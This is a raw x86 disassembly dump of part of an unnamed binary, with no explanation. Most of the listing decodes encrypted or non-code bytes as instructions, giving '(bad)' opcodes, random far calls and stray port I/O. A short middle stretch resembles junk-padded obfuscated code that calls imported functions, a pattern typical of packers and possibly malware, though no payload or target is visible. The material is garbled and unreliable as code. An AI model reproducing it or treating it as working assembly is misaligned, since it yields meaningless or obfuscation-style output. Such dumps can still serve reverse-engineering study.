  406a8f:	shl    BYTE PTR [ecx+0x1dc68f24],cl
  406a95:	dec    cx
  406a97:	sub    eax,0x6be324c5
  406a9c:	in     eax,0xe9
  406a9e:	jmp    0x406acd
  406aa0:	push   edi
  406aa1:	dec    esp
  406aa2:	sub    DWORD PTR [ecx+0x70],0xffffffdf
  406aa6:	sub    dh,ah
  406aa8:	and    al,0x1e
  406aaa:	cmp    al,0x57
  406aac:	arpl   cx,cx
  406aae:	push   edi
  406aaf:	and    cl,BYTE PTR [ebx+eiz*2+0x64342f0a]
  406ab6:	popa   
  406ab7:	retf   0xdb3b
  406aba:	and    al,BYTE PTR [ebx+ebx*2-0x6c]
  406abe:	loope  0x406a71
  406ac0:	mov    al,ds:0xeda9ec5a
  406ac5:	xchg   ecx,eax
  406ac6:	call   0xcf55:0x475bdc28
  406acd:	(bad)  
  406ace:	sub    eax,0xee96b908
  406ad3:	inc    ecx
  406ad4:	xchg   DWORD PTR [ebx+0x38f39a5],ecx
  406ada:	push   0xfffffff8
  406adc:	dec    edx
  406add:	pusha  
  406ade:	lea    esi,[edi+0xe]
  406ae1:	dec    ebx
  406ae2:	inc    ebp
  406ae3:	bts    DWORD PTR [edx-0x2c],0xd1
  406ae8:	fnstsw WORD PTR [ebp+0x34]
  406aeb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406aec:	cmp    al,0x6
  406aee:	add    eax,0x652eed6e
  406af3:	lahf   
  406af4:	mov    ecx,0xe6959b10
  406af9:	mov    esi,0x5ff6020d
  406afe:	cmp    eax,0x423b59a0
  406b03:	ins    DWORD PTR es:[edi],dx
  406b04:	push   es
  406b05:	sbb    DWORD PTR [ebp+0x333f3280],edx
  406b0b:	call   0x2dc6d792
  406b10:	cmp    BYTE PTR [edx-0x3e5efb6c],cl
  406b16:	pop    ds
  406b17:	dec    ebp
  406b18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406b19:	sub    esi,DWORD PTR [edi-0x6feba9a2]
  406b1f:	adc    DWORD PTR [ebp+eax*1+0x737205de],eax
  406b26:	jbe    0x406b42
  406b28:	repnz gs hlt 
  406b2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b2c:	test   BYTE PTR [esi-0x26c8ef35],0x13
  406b33:	add    eax,0x2a0fdb08
  406b38:	cdq    
  406b39:	dec    esp
  406b3a:	mov    fs,WORD PTR [edi-0x1451dc2f]
  406b40:	xor    bl,BYTE PTR [eax+0x82cdb21]
  406b46:	(bad)  
  406b47:	cwde   
  406b48:	and    BYTE PTR [edi+edx*8+0x5b],cl
  406b4c:	stos   BYTE PTR es:[edi],al
  406b4d:	ins    BYTE PTR es:[edi],dx
  406b4e:	loopne 0x406b01
  406b50:	jmp    0x247087dd
  406b55:	dec    ecx
  406b56:	mov    esi,0x683646e1
  406b5b:	mov    ds:0x66369d01,al
  406b60:	jmp    DWORD PTR [eax+0x24fa3739]
  406b66:	or     BYTE PTR [edx+0x7c8c8cac],dl
  406b6c:	mov    DWORD PTR [ecx-0x4249198b],ecx
  406b72:	pop    eax
  406b73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b74:	inc    eax
  406b75:	push   ds
  406b76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b77:	mov    ebp,DWORD PTR [edi+0x666e5f85]
  406b7d:	pop    ds
  406b7e:	or     ah,ah
  406b80:	jl     0x406bbd
  406b82:	jge    0x406b1e
  406b84:	je     0x406b11
  406b86:	cdq    
  406b87:	mov    dl,0xa9
  406b89:	fs into 
  406b8b:	fisubr WORD PTR [edx-0x26]
  406b8e:	and    edi,ebp
  406b90:	adc    edx,ecx
  406b92:	mov    ds:0x7047fdd4,al
  406b97:	outs   dx,BYTE PTR ds:[esi]
  406b98:	sar    DWORD PTR [edx+0x7a],cl
  406b9b:	push   esi
  406b9c:	xchg   BYTE PTR [ecx],ch
  406b9e:	xlat   BYTE PTR ds:[ebx]
  406b9f:	and    ecx,eax
  406ba1:	imul   ebx,DWORD PTR [esi+0x263a4286],0x75
  406ba8:	jbe    0x406b73
  406baa:	call   0xe0728ae3
  406baf:	xchg   ebp,eax
  406bb0:	sbb    dl,ch
  406bb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406bb3:	mov    dh,0x4c
  406bb5:	fstp   DWORD PTR [ecx+0x10a060ea]
  406bbb:	(bad)  
  406bbc:	jg     0x406c15
  406bbe:	adc    DWORD PTR [ebp+0x668054ae],0x34f01947
  406bc8:	or     DWORD PTR [ebx+ecx*4-0x36],edx
  406bcc:	mov    DWORD PTR [ebp-0x1f],0x3a4a3f82
  406bd3:	sbb    esi,DWORD PTR [ecx+ebx*8-0x60]
  406bd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406bd8:	stc    
  406bd9:	pushf  
  406bda:	xchg   edx,eax
  406bdb:	xchg   edi,eax
  406bdc:	push   edi
  406bdd:	outs   dx,DWORD PTR ds:[esi]
  406bde:	pushf  
  406bdf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406be0:	xchg   esi,eax
  406be1:	repz rol DWORD PTR [eax+eiz*4],0x21
  406be6:	fstp   TBYTE PTR [edi-0x67]
  406be9:	dec    esi
  406bea:	mov    esp,0x70b18ea5
  406bef:	fld    DWORD PTR [ebx+0x3e]
  406bf2:	cs push 0x21
  406bf5:	jne    0x406bb4
  406bf7:	push   ss
  406bf8:	popa   
  406bf9:	mov    edi,0xe9c48a2a
  406bfe:	pop    ds
  406bff:	ja     0x406b93
  406c01:	cmc    
  406c02:	jno    0x406bc4
  406c04:	dec    ebp
  406c05:	fisttp DWORD PTR [ecx-0x29bf0fde]
  406c0b:	inc    edx
  406c0c:	inc    esi
  406c0d:	pop    ebx
  406c0e:	stc    
  406c0f:	mov    gs,WORD PTR [eax]
  406c11:	(bad)  
  406c12:	mov    eax,ds:0xf0c6971a
  406c17:	push   eax
  406c18:	and    BYTE PTR [ebx+edi*2],cl
  406c1b:	and    eax,0xf58be581
  406c20:	dec    esi
  406c21:	jmp    0x406c7a
  406c23:	lods   al,BYTE PTR ds:[esi]
  406c24:	cmc    
  406c25:	xor    BYTE PTR [ebp-0x2e],cl
  406c28:	pushf  
  406c29:	mov    ebp,DWORD PTR [ebx-0x3c0d9f4f]
  406c2f:	inc    edi
  406c30:	iret   
  406c31:	adc    al,0xdf
  406c33:	sub    eax,DWORD PTR ds:0x9711a3f2
  406c39:	push   ebx
  406c3a:	xchg   DWORD PTR [ebx-0x3942e186],ebp
  406c40:	push   esp
  406c41:	iret   
  406c42:	das    
  406c43:	in     eax,dx
  406c44:	push   ds
  406c45:	push   ax
  406c47:	push   esi
  406c48:	sahf   
  406c49:	out    0x54,al
  406c4b:	pop    ebp
  406c4c:	mov    eax,ds:0xa360d56b
  406c51:	sbb    eax,edx
  406c53:	mov    ebp,0x1b2ee3c3
  406c58:	rcr    DWORD PTR [esi-0x17],1
  406c5b:	mov    al,0x17
  406c5d:	inc    eax
  406c5e:	jle    0x406c61
  406c60:	imul   ecx,DWORD PTR [esi-0x40],0x6d
  406c64:	xchg   esp,eax
  406c65:	popa   
  406c66:	popf   
  406c67:	or     al,0xfc
  406c69:	pusha  
  406c6a:	(bad)  
  406c6b:	outs   dx,DWORD PTR ds:[esi]
  406c6c:	xor    eax,DWORD PTR ds:0x853b26db
  406c72:	push   ecx
  406c73:	out    dx,al
  406c74:	lods   al,BYTE PTR ds:[esi]
  406c75:	mov    dh,0x33
  406c77:	and    eax,0x6b926c55
  406c7c:	in     al,dx
  406c7d:	mov    eax,0x94f15b65
  406c82:	push   esi
  406c83:	adc    ebx,DWORD PTR [edx+0x23]
  406c86:	push   edi
  406c87:	or     eax,0x6706dbf3
  406c8c:	jb     0x406c1c
  406c8e:	mov    BYTE PTR [eax],ch
  406c90:	lea    eax,[edi]
  406c92:	xchg   ecx,eax
  406c93:	add    esp,0xffffffdf
  406c96:	xchg   esi,eax
  406c97:	jg     0x406c9f
  406c99:	sar    BYTE PTR ds:0x548ebac4,cl
  406c9f:	jp     0x406c34
  406ca1:	add    al,0x49
  406ca3:	retf   0x695b
  406ca6:	dec    eax
  406ca7:	lea    ebx,[ebp-0x493267a7]
  406cad:	(bad)  
  406cae:	push   ebx
  406caf:	int3   
  406cb0:	mov    al,0x94
  406cb2:	(bad)  
  406cb3:	out    0x71,al
  406cb5:	cli    
  406cb6:	iret   
  406cb7:	sbb    eax,0xf7ebb54f
  406cbc:	jmp    0x406cb3
  406cbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406cbf:	imul   ecx,DWORD PTR [ebx+0x77],0x6a4105ee
  406cc6:	iret   
  406cc7:	mov    ebp,0xe07569b5
  406ccc:	lods   eax,DWORD PTR ds:[esi]
  406ccd:	xchg   edi,eax
  406cce:	imul   edi,DWORD PTR [ebp+0x32938fc9],0x3
  406cd5:	jmp    0xe04a8c88
  406cda:	ficom  DWORD PTR ds:0x3fcdb1c0
  406ce0:	or     dh,al
  406ce2:	and    esp,DWORD PTR [ebp-0x3e347ee7]
  406ce8:	jns    0x406d5d
  406cea:	sbb    eax,0x87ea62b7
  406cef:	pop    edi
  406cf0:	xchg   ebx,eax
  406cf1:	pop    esi
  406cf2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406cf3:	lea    edx,[ebp+esi*4+0x3af0b96c]
  406cfa:	pop    eax
  406cfb:	jmp    0x406d25
  406cfd:	popa   
  406cfe:	push   cs
  406cff:	mov    ds,WORD PTR [eax+0x19dd9d3e]
  406d05:	int3   
  406d06:	push   ss
  406d07:	(bad)  
  406d08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d09:	push   edx
  406d0a:	adc    ebx,DWORD PTR [ebx-0x7b]
  406d0d:	inc    ebx
  406d0e:	inc    ecx
  406d0f:	mov    ebp,0xab2dd85
  406d14:	ficomp WORD PTR [edx+0x1319c529]
  406d1a:	das    
  406d1b:	sahf   
  406d1c:	adc    eax,0x6993ab13
  406d21:	ret    0x91e6
  406d24:	dec    eax
  406d25:	mov    ds:0x8e6f2cf7,al
  406d2a:	xchg   esp,eax
  406d2b:	daa    
  406d2c:	push   edi
  406d2d:	out    dx,eax
  406d2e:	xor    DWORD PTR [edi+0x18f96793],edi
  406d34:	inc    edi
  406d35:	sbb    bl,ch
  406d37:	add    edi,esp
  406d39:	mov    ebp,0xe3c58f06
  406d3e:	js     0x406d96
  406d40:	adc    al,0xa5
  406d42:	mov    es,esi
  406d44:	adc    esi,edx
  406d46:	jno    0x406d88
  406d48:	mov    ecx,DWORD PTR [edx]
  406d4a:	lahf   
  406d4b:	retf   0x3b7b
  406d4e:	es dec esp
  406d50:	add    BYTE PTR [ecx],al
  406d52:	mov    al,0x2
  406d54:	or     edx,ebp
  406d56:	ja     0x406d12
  406d58:	inc    esi
  406d59:	mov    DWORD PTR [edx],edx
  406d5b:	lock pushf 
  406d5d:	fild   DWORD PTR [ebp-0x68d4cfc2]
  406d63:	shl    BYTE PTR [esi],cl
  406d65:	jge    0x406d81
  406d67:	mov    ds:0xc4c892e0,al
  406d6c:	xlat   BYTE PTR ds:[ebx]
  406d6d:	jns    0x406d2f
  406d6f:	sbb    bh,BYTE PTR [esp+eiz*4-0x3106acd]
  406d76:	cmp    ah,bl
  406d78:	lds    ecx,FWORD PTR [edi+ebp*4]
  406d7b:	or     BYTE PTR [edx-0x625fe2fb],dh
  406d81:	adc    eax,0xf4ae8a02
  406d86:	aas    
  406d87:	dec    ebx
  406d88:	inc    ebx
  406d89:	cld    
  406d8a:	(bad)
  406d8d:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d8f:	mov    eax,ds:0xaff870e2
  406d94:	sub    bl,BYTE PTR [eax-0x1e4395a1]
  406d9a:	mov    ebx,0x338bba99
  406d9f:	rol    DWORD PTR ds:0x8394837,cl
  406da5:	and    eax,0x6a5cbe4
  406daa:	add    DWORD PTR [edi],0x6f
  406dad:	and    ch,bh
  406daf:	pop    edi
  406db0:	out    dx,eax
  406db1:	scas   al,BYTE PTR es:[edi]
  406db2:	out    dx,eax
  406db3:	fdivr  DWORD PTR [esi-0x57]
  406db6:	mov    al,cs:0xd5fc23ed
  406dbc:	mov    ds:0xda6fd6dc,eax
  406dc1:	shl    BYTE PTR [ebx],1
  406dc3:	mov    bh,0x2b
  406dc5:	cmp    al,0x49
  406dc7:	push   cs
  406dc8:	(bad)  
  406dc9:	out    0x50,al
  406dcb:	jge    0x406d66
  406dcd:	mov    dl,0x75
  406dcf:	sti    
  406dd0:	inc    ecx
  406dd1:	mov    edx,DWORD PTR [ecx-0x6390fcc1]
  406dd7:	and    eax,0x2b5566e6
  406ddc:	push   ebp
  406ddd:	pop    es
  406dde:	cmp    edx,ebp
  406de0:	out    dx,eax
  406de1:	lahf   
  406de2:	xor    DWORD PTR [edi],ebp
  406de4:	and    al,0xbd
  406de6:	mov    DWORD PTR [ebx+0x1d],ebp
  406de9:	leave  
  406dea:	loope  0x406d8c
  406dec:	mov    al,0x8e
  406dee:	imul   edi,DWORD PTR [ebp-0x25],0x8274399b
  406df5:	sahf   
  406df6:	jmp    0x406dc9
  406df8:	inc    edi
  406df9:	jge    0x406e72
  406dfb:	add    bl,BYTE PTR [esi+ecx*2+0x3f]
  406dff:	(bad)  
  406e00:	push   esi
  406e01:	mov    ds,WORD PTR [edi]
  406e03:	stos   BYTE PTR es:[edi],al
  406e04:	push   esp
  406e05:	fidivr WORD PTR [ecx+0xeb58d77]
  406e0b:	and    DWORD PTR [eax],ebx
  406e0d:	mov    al,0xa1
  406e0f:	xor    eax,0x72dd7b
  406e14:	data16 stos BYTE PTR es:[edi],al
  406e16:	jmp    0xdc84d116
  406e1b:	lahf   
  406e1c:	pop    es
  406e1d:	(bad)  
  406e1e:	and    ch,BYTE PTR [ecx]
  406e20:	mov    ds:0xf0514b80,eax
  406e25:	retf   0x6629
  406e28:	jb     0x406dc6
  406e2a:	pop    es
  406e2b:	pop    eax
  406e2c:	push   esp
  406e2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e2e:	jle    0x406ea0
  406e30:	adc    BYTE PTR [esi+0x65],dl
  406e33:	xor    esi,edx
  406e35:	rcr    BYTE PTR [edx-0x45],cl
  406e38:	fucomi st,st(0)
  406e3a:	sar    DWORD PTR [edi-0x62],1
  406e3d:	and    al,0xf1
  406e3f:	jo     0x406e7f
  406e41:	mov    DWORD PTR [edx],edx
  406e43:	jns    0x406ddf
  406e45:	dec    esi
  406e46:	sub    dl,al
  406e48:	push   eax
  406e49:	sahf   
  406e4a:	ret    
  406e4b:	out    dx,al
  406e4c:	add    BYTE PTR [ebx-0x770880e2],0xb
  406e53:	cwde   
  406e54:	(bad)  
  406e55:	and    bl,BYTE PTR [ecx+0x24]
  406e58:	jle    0x406e6e
  406e5a:	mov    ?,WORD PTR [ebp+0x73]
  406e5d:	pusha  
  406e5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e5f:	lods   al,BYTE PTR ds:[esi]
  406e60:	gs push 0xffffffc6
  406e63:	lds    ecx,FWORD PTR [eax-0xb]
  406e66:	loop   0x406eaf
  406e68:	out    0x62,al
  406e6a:	pusha  
  406e6b:	xchg   BYTE PTR [ecx+ebx*1+0x389443be],bh
  406e72:	fdiv   QWORD PTR [edx-0x3284b213]
  406e78:	jle    0x406ecb
  406e7a:	lea    ecx,[ebx+0x7b5d719e]
  406e80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e81:	test   al,0x71
  406e83:	pop    eax
  406e84:	outs   dx,BYTE PTR ds:[esi]
  406e85:	mov    al,0x62
  406e87:	inc    edi
  406e88:	sar    DWORD PTR [esi],cl
  406e8a:	lahf   
  406e8b:	addr16 test eax,edx
  406e8e:	inc    esp
  406e8f:	arpl   WORD PTR [ecx+0x772908c6],dx
  406e95:	das    
  406e96:	inc    esi
  406e97:	call   0xbfe7852b
  406e9c:	cdq    
  406e9d:	sti    
  406e9e:	push   ss
  406e9f:	mov    ds:0x3f2fe441,al
  406ea4:	push   es
  406ea5:	jno    0x406e82
  406ea7:	push   ds
  406ea8:	jp     0x406ef8
  406eaa:	mov    bl,0xf5
  406eac:	fldcw  WORD PTR [esi-0x4400369d]
  406eb2:	sti    
  406eb3:	loop   0x406f16
  406eb5:	fsubr  st(7),st
  406eb7:	sub    esi,DWORD PTR [ebp+0x3b]
  406eba:	push   ebx
  406ebb:	(bad)  
  406ebc:	int    0x70
  406ebe:	xchg   edx,eax
  406ebf:	add    esi,DWORD PTR [edx+ebp*2+0x63de09d6]
  406ec6:	mov    BYTE PTR [edx],ah
  406ec8:	clc    
  406ec9:	retf   0x5d38
  406ecc:	sbb    DWORD PTR [eax+0x63],ebp
  406ecf:	std    
  406ed0:	imul   ebx,DWORD PTR [edx],0x0
  406ed3:	xchg   ecx,eax
  406ed4:	sti    
  406ed5:	xchg   edi,eax
  406ed6:	xchg   edx,eax
  406ed7:	xor    eax,esi
  406ed9:	jne    0x406ec6
  406edb:	out    dx,al
  406edc:	out    dx,eax
  406edd:	mov    ebp,ecx
  406edf:	addr16 in al,0xee
  406ee2:	imul   eax,edx,0x8a36ff9d
  406ee8:	jbe    0x406ece
  406eea:	push   edx
  406eeb:	xchg   ch,bh
  406eed:	mov    ah,BYTE PTR [edi+0x2b8b1951]
  406ef3:	push   es
  406ef4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ef5:	xlat   BYTE PTR ds:[ebx]
  406ef6:	cs jle 0x406e9d
  406ef9:	subps  xmm1,XMMWORD PTR [ebx]
  406efc:	mov    dh,0x99
  406efe:	hlt    
  406eff:	call   0x164df93b
  406f04:	aad    0x4
  406f06:	dec    ecx
  406f07:	cli    
  406f08:	push   0x3b316ac1
  406f0d:	or     edi,DWORD PTR [ebx]
  406f0f:	mov    al,0x44
  406f11:	enter  0x1b44,0x2b
  406f15:	mov    ecx,0x13efa101
  406f1a:	retf   0x30a
  406f1d:	sbb    eax,0x65eaf3c4
  406f22:	jmp    0x42ba:0xd0f84c40
  406f29:	adc    dh,BYTE PTR [ecx+0x42f0ff7a]
  406f2f:	push   ecx
  406f30:	and    esp,DWORD PTR ds:0x5d63698
  406f36:	loope  0x406fa2
  406f38:	fs in  eax,dx
  406f3a:	les    ecx,FWORD PTR [ebp-0x57]
  406f3d:	in     eax,0xb9
  406f3f:	mov    al,0x86
  406f41:	fisubr DWORD PTR fs:[ebx]
  406f44:	adc    edx,DWORD PTR [edx-0xe73210e]
  406f4a:	inc    ebx
  406f4b:	xchg   esp,eax
  406f4c:	push   esp
  406f4d:	outs   dx,BYTE PTR ds:[esi]
  406f4e:	jne    0x406f9f
  406f50:	out    dx,al
  406f51:	xlat   BYTE PTR ds:[ebx]
  406f52:	adc    DWORD PTR [edx],ecx
  406f54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f55:	push   0x176be19d
  406f5a:	int    0x30
  406f5c:	add    edx,DWORD PTR [eax+0x58]
  406f5f:	shl    DWORD PTR [edi+0x37],cl
  406f62:	(bad)  
  406f64:	xchg   esi,eax
  406f65:	jmp    0x406f2f
  406f67:	cmp    DWORD PTR [ebx],ebp
  406f69:	or     ecx,DWORD PTR [ecx]
  406f6b:	jle    0x406f47
  406f6d:	sbb    DWORD PTR [ecx+edx*8-0x5f],esi
  406f71:	dec    ecx
  406f72:	adc    dh,BYTE PTR [edx-0x30455e5f]
  406f78:	jmp    0xf3f4:0x998ae3b9
  406f7f:	test   al,0x56
  406f81:	arpl   WORD PTR [eax+0x52212e48],ax
  406f87:	popaw  
  406f89:	jb     0x406fdf
  406f8b:	shl    ecx,1
  406f8d:	sub    DWORD PTR [edx+0x1be58cd2],eax
  406f93:	loop   0x406f5a
  406f95:	mov    eax,ds:0xa4097918
  406f9a:	lds    edx,FWORD PTR [edi+0x1170c074]
  406fa0:	jle    0x406f22
  406fa2:	mov    eax,0x1ee1c1cd
  406fa7:	xor    ecx,ecx
  406fa9:	xor    DWORD PTR ds:0x4229ba,0x4229a2
  406fb3:	or     ecx,DWORD PTR [ebp-0x1c]
  406fb6:	shr    edx,0x2
  406fb9:	xor    edx,DWORD PTR ds:0x422892
  406fbf:	mov    edx,DWORD PTR [esi+0x4]
  406fc2:	mov    DWORD PTR [ebp-0x2c],ecx
  406fc5:	cmp    DWORD PTR ds:0x422992,0x0
  406fcc:	mov    DWORD PTR ds:0x4228ee,0x4f9e
  406fd6:	mov    edx,0x30c0
  406fdb:	mov    edx,DWORD PTR ds:0x422936
  406fe1:	jmp    0x407022
  406fe6:	mov    DWORD PTR ds:0x42296a,0x6ad7
  406ff0:	je     0x407011
  406ff6:	push   0x592a
  406ffb:	call   DWORD PTR ds:0x42a018
  407001:	xor    edx,edx
  407003:	or     edx,DWORD PTR ds:0x4228b6
  407009:	xor    DWORD PTR ds:0x42294a,edx
  40700f:	add    ecx,edx
  407011:	inc    ecx
  407012:	or     ecx,0x572d
  407018:	adc    DWORD PTR ds:0x422992,0x6861
  407022:	mov    ecx,DWORD PTR [ebp+0x18]
  407025:	cmp    DWORD PTR ds:0x422966,0x0
  40702c:	mov    DWORD PTR ds:0x42299a,0x24bb
  407036:	mov    DWORD PTR ds:0x422992,0x4860
  407040:	jmp    0x4070fc
  407045:	mov    DWORD PTR ds:0x4228ea,0x356f
  40704f:	jle    0x407079
  407055:	push   DWORD PTR [ebp-0x18]
  407058:	push   0x5570
  40705d:	push   0x150b
  407062:	push   0x5476
  407067:	push   0x7791
  40706c:	push   0x2991
  407071:	call   DWORD PTR ds:0x42a01c
  407077:	inc    edx
  407078:	dec    edx
  407079:	sbb    DWORD PTR ds:0x4229c6,0x42296e
  407083:	sub    edx,DWORD PTR ds:0x422926
  407089:	cmp    DWORD PTR ds:0x4228d6,0x0
  407090:	mov    edx,DWORD PTR ds:0x422952
  407096:	mov    edx,0x5ca6
  40709b:	not    edx
  40709d:	jmp    0x4070fc
  4070a2:	mov    DWORD PTR ds:0x4228f6,0x627
  4070ac:	jae    0x4070d8
  4070b2:	push   0x5b8a
  4070b7:	push   0x190e
  4070bc:	call   DWORD PTR ds:0x42a2a0
  4070c2:	add    DWORD PTR ds:0x42297a,edi
  4070c8:	xor    DWORD PTR ds:0x42293a,edi
  4070ce:	and    DWORD PTR ds:0x4229b2,0x7045
  4070d8:	sbb    DWORD PTR ds:0x4228f6,0x244f
  4070e2:	adc    DWORD PTR ds:0x4229a2,ebx
  4070e8:	xor    edx,edx
  4070ea:	xor    edx,DWORD PTR ds:0x42296e
  4070f0:	add    edx,DWORD PTR ds:0x422986
  4070f6:	mov    DWORD PTR ds:0x42296e,edx
  4070fc:	mov    edx,DWORD PTR [ebp+0x1c]
  4070ff:	shrd   ecx,edx,0x2
  407103:	add    DWORD PTR ds:0x4229be,0x1936
  40710d:	jmp    0x407697
  407112:	loope  0x4070db
  407114:	ja     0x407111
  407116:	xor    DWORD PTR [edx],ebx
  407118:	pusha  
  407119:	pushf  
  40711a:	sub    DWORD PTR [edi],esp
  40711c:	scas   al,BYTE PTR es:[edi]
  40711d:	jb     0x407113
  40711f:	aad    0x4c
  407121:	je     0x4070ec
  407123:	ins    DWORD PTR es:[edi],dx
  407124:	push   ss
  407125:	push   ss
  407126:	cmp    eax,0xba161604
  40712b:	cmp    cl,BYTE PTR [ebx-0x11]
  40712e:	sbb    al,0xb6
  407130:	pop    ecx
  407131:	scas   eax,DWORD PTR es:[edi]
  407132:	mov    ds:0x928a2b67,eax
  407137:	mov    edx,0x68bd918d
  40713c:	inc    edx
  40713d:	sbb    BYTE PTR [eax-0xa],bl
  407140:	push   edx
  407141:	lds    ebx,FWORD PTR [eax]
  407143:	or     BYTE PTR [ebp+0x4039e368],bl
  407149:	add    eax,0xd1561598
  40714e:	dec    ebx
  40714f:	adc    ebp,DWORD PTR [ecx-0x6d]
  407152:	sub    DWORD PTR [esi-0x5f],esi
  407155:	fnstcw WORD PTR [edi-0x1b7bfc3a]
  40715b:	in     al,dx
  40715c:	push   edx
  40715d:	adc    al,BYTE PTR [eax*2+0x1affd082]
  407164:	mov    dh,BYTE PTR [ebx]
  407166:	outs   dx,BYTE PTR ds:[esi]
  407167:	jae    0x407105
  407169:	test   eax,0x1e64c63a
  40716e:	jb     0x4071cb
  407170:	(bad)  
  407171:	fdivrp st(5),st
  407173:	shr    edi,0x17
  407176:	add    BYTE PTR [eax-0x1451eccc],0x21
  40717d:	loope  0x4071fa
  40717f:	jmp    0x4071c5
  407181:	mov    cl,0xec
  407183:	push   es
  407184:	xor    ebp,DWORD PTR [ecx+0x48c09703]
  40718a:	cmp    BYTE PTR [edi-0x11a498f3],ah
  407190:	pushf  
  407191:	les    ebx,FWORD PTR [ebp+0x53]
  407194:	int    0xd2
  407196:	shr    bh,1
  407198:	adc    dl,BYTE PTR [edi+0x4369c351]
  40719e:	mov    al,0x96
  4071a0:	ret    
  4071a1:	add    al,0xa5
  4071a3:	pop    ebp
  4071a4:	mov    esp,0xdd43ceee
  4071a9:	mov    ?,WORD PTR [ecx]
  4071ab:	sub    eax,0xcfdbeef7
  4071b0:	test   DWORD PTR [ebp-0x77],ebp
  4071b3:	icebp  
  4071b4:	popa   
  4071b5:	dec    edx
  4071b6:	push   cs
  4071b7:	sbb    DWORD PTR [eax],edi
  4071b9:	lods   al,BYTE PTR cs:[esi]
  4071bb:	adc    BYTE PTR [eax+0x1cf544bc],ch
  4071c1:	sub    edi,ebx
  4071c3:	dec    ebp
  4071c4:	arpl   WORD PTR [edi-0x70],di
  4071c7:	ins    BYTE PTR es:[edi],dx
  4071c8:	mov    ds:0x6fa90652,al
  4071cd:	mov    ebp,0x23b5ef82
  4071d2:	shl    DWORD PTR ds:0xc1700c15,0x4
  4071d9:	sub    ebx,DWORD PTR [edx]
  4071db:	in     eax,dx
  4071dc:	stos   DWORD PTR es:[edi],eax
  4071dd:	push   ebp
  4071de:	dec    eax
  4071df:	inc    esp
  4071e0:	xor    eax,0x4ee88ac1
  4071e5:	inc    esp
  4071e6:	addr16 cdq 
  4071e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4071e9:	pop    eax
  4071ea:	retf   
  4071eb:	stc    
  4071ec:	mov    eax,0x2b198ddc
  4071f1:	call   DWORD PTR [edi]
  4071f3:	and    edi,DWORD PTR [ebx+0x3f]
  4071f6:	xchg   ebp,eax
  4071f7:	pop    ebx
  4071f8:	xor    ebx,0xffffffb3
  4071fb:	push   ebp
  4071fc:	pop    edi
  4071fd:	adc    al,BYTE PTR [edx+0x72ff612e]
  407203:	pop    ebp
  407204:	lods   al,BYTE PTR ds:[esi]
  407205:	push   ds
  407206:	enter  0x2131,0xbb
  40720a:	addr16 iret 
  40720c:	test   eax,0x7ca82038
  407211:	mov    DWORD PTR [edx+0x26e81e34],edx
  407217:	mov    esi,0xb16da8e3
  40721c:	dec    ecx
  40721d:	aaa    
  40721e:	popa   
  40721f:	or     edi,DWORD PTR [ebx]
  407221:	jne    0x4071e6
  407223:	lods   al,BYTE PTR ds:[esi]
  407224:	fcomp  QWORD PTR [esi+ebp*4-0x3b]
  407228:	retf   0xe4b7
  40722b:	adc    al,0x6d
  40722d:	mov    al,ds:0xfe1e1939
  407232:	mov    ebp,0x2c499509
  407237:	push   edx
  407238:	sahf   
  407239:	inc    ebx
  40723a:	jb     0x4071d8
  40723c:	(bad)  
  40723d:	jl     0x40723c
  40723f:	mov    DWORD PTR [ebp-0x377b3329],ebx
  407245:	enter  0xbd08,0xb
  407249:	push   ebx
  40724a:	jp     0x407232
  40724c:	loop   0x40721c
  40724e:	popf   
  40724f:	pusha  
  407250:	jb     0x407268
  407252:	ds loope 0x407282
  407255:	inc    edx
  407256:	or     DWORD PTR [edx+0x5e3bc0],edi
  40725c:	ins    BYTE PTR es:[edi],dx
  40725d:	or     ch,BYTE PTR [ebp+0x5]
  407260:	pop    esi
  407261:	mov    BYTE PTR [esi+ebx*4+0x27d28f56],dl
  407268:	hlt    
  407269:	xchg   edx,eax
  40726a:	adc    edx,ecx
  40726c:	mov    DWORD PTR [edi-0x64c02f44],eax
  407272:	mov    ebp,0x3b5cfcf9
  407277:	cdq    
  407278:	arpl   WORD PTR [esi+0x7c],di
  40727b:	lock xchg ebp,eax
  40727d:	test   al,0x1
  40727f:	test   bl,0x23
  407282:	jnp    0x407280
  407284:	jne    0x40722f
  407286:	pop    es
  407287:	add    ebp,eax
  407289:	lds    esi,FWORD PTR [esi+edx*8-0x5c5ec680]
  407290:	mov    ecx,0x615e0814
  407295:	ret    
  407296:	pop    ebp
  407297:	icebp  
  407298:	jae    0x4072fc
  40729a:	or     DWORD PTR [edx-0x54],ebp
  40729d:	xor    cl,BYTE PTR [ebp+0x5b58de00]
  4072a3:	inc    edx
  4072a4:	in     al,0xfb
  4072a6:	xchg   esp,eax
  4072a7:	fld    TBYTE PTR [edi-0x66]
  4072aa:	sbb    eax,0xd88461bc
  4072af:	inc    esp
  4072b0:	or     al,0xa8
  4072b2:	and    eax,0xe4ceb94a
  4072b7:	add    DWORD PTR [esi],esp
  4072b9:	cdq    
  4072ba:	xchg   esi,eax
  4072bb:	outs   dx,BYTE PTR ds:[esi]
  4072bc:	loopne 0x40727e
  4072be:	popf   
  4072bf:	sbb    BYTE PTR [eax],0x15
  4072c2:	push   esi
  4072c3:	je     0x4072b5
  4072c5:	std    
  4072c6:	sbb    dl,BYTE PTR [ecx+0x55]
  4072c9:	mov    eax,0x42f893a9
  4072ce:	aas    
  4072cf:	jno    0x40728f
  4072d1:	pop    ss
  4072d2:	jecxz  0x407254
  4072d4:	push   edi
  4072d5:	push   0xffffffaa
